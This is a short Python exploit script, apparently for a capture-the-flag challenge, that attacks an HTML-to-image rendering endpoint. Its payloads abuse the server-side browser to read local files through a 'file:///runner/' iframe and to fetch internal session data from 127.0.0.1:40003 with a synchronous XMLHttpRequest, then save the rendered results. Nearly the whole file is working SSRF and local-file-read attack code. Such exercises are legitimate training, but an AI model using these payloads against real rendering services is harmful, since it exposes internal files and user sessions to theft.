import requests, io, zipfile, time

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'

def render(html, name):
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    for _ in range(2):
        try:
            r = s.post(BASE + '/html-to-image', json={'pages': [html]}, timeout=60)
            if r.status_code == 200 and 'zip' in r.headers.get('Content-Type',''):
                z = zipfile.ZipFile(io.BytesIO(r.content))
                for n in z.namelist():
                    with open(f'f:/mission-git-hackss/mission-git-hackss/d_{name}.jpg','wb') as f: f.write(z.read(n))
                    print(f'{name}: {len(z.read(n))} bytes OK')
                return True
            print(f'{name}: [{r.status_code}] {r.text[:150]}')
            return False
        except Exception as e: time.sleep(2)
    return False

# 1. Direct iframe of /runner/ (does render Chrome read it?)
render('<iframe src="file:///runner/" style="width:1250px;height:1400px;border:0"></iframe>', 'runner_iframe')
time.sleep(1)
# 2. Reuse existing sessions on 40003 (sync GET is fast)
js = r'''<!doctype html><html><head><style>body{font-family:monospace;font-size:14px;white-space:pre-wrap;word-break:break-all;padding:10px}</style></head><body><div id=o>x</div><script>
var x=new XMLHttpRequest();x.open("GET","http://127.0.0.1:40003/sessions",false);x.send();
document.getElementById('o').textContent="SESSIONS:"+x.responseText;
</script></body></html>'''
render(js, 'sessions')
